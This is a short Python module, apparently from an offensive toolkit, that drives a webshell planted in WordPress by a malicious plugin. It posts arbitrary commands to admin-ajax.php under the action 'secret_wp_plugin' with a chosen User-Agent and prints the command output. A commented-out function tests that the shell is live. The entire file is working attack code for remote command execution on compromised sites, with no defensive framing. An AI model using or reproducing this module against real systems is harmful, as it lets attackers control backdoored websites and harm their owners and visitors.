'''
name : Exec webshell via admin ajax
description : This module executes commands via a admin ajax webshell in WordPress.
version : 1.1
author : Ayato
'''

import requests

def run_request(ip, cmd, user_agent):
    print(f"[*] Checking evil plugin webshell on {ip}")
    shell_url = f"http://{ip}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": f"{user_agent}"
    }
    data = {
        "action": "secret_wp_plugin",
        "cmd": cmd
    }
    try:
        res = requests.post(
            url=shell_url,
            headers=headers,
            data=data,
            timeout=(10, 10),
            allow_redirects=False
        )
        if res.status_code == 200:
            print(f"[+] Webshell is working on {ip}. Command output: {res.text.strip()}")
            return True
        else:
            print(f"[-] Webshell did not respond as expected on {ip}.")
            return False
    except Exception as e:
        print(f"[-] Error checking webshell on {ip}: {e}")
        return False

"""
def check_shell(ip):
    print(f"[*] Checking evil plugin webshell on {ip}")
    time.sleep(2)
    cmd = "echo WP_Evil_Plugin_Test OK"
    shell_url = f"http://{ip}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    data = {
        "action": "secret_wp_plugin",
        "cmd": cmd
    }
    try:
        res = requests.post(
            url=shell_url,
            headers=headers,
            data=data,
            timeout=(10, 10),
            allow_redirects=False
        )
        if res.status_code == 200 and "WP_Evil_Plugin_Test" in res.text:
            print(f"[+] Webshell is working on {ip}. Command output: {res.text.strip()}")
            return True
        else:
            print(f"[-] Webshell did not respond as expected on {ip}.")
            return False
    except Exception as e:
        print(f"[-] Error checking webshell on {ip}: {e}")
        return False
"""

def run(ip, user_agent, command):
    print("[*] Running webshell execution module...")
    print(f"[*] Target IP: {ip}")
    ret = run_request(ip, command, user_agent)
    if not ret:
        print(f"[-] Webshell execution module failed on {ip}.")
        return -1
    print(f"[*] Webshell execution module completed on {ip}.")
    return 0